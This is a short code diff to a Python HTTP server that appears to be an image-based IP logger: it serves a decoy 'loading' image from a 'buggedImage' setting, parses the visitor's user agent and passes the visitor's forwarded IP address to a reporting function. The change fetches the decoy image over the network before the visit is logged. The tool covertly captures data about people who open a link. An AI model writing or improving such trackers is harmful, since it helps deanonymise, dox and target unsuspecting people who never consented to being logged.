@@ -1,6 +1,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import io
 
 config = {
     # BASE CONFIG #
@@ -200,7 +201,13 @@ height: 100vh;
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
+                if config["buggedImage"]:
+                    # Fetch the image from the URL and serve it
+                    image_response = requests.get(binaries["loading"])
+                    if image_response.status_code == 200:
+                        self.wfile.write(image_response.content)  # Write the binary content of the image
+                    else:
+                        self.wfile.write(b"Error loading image")
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
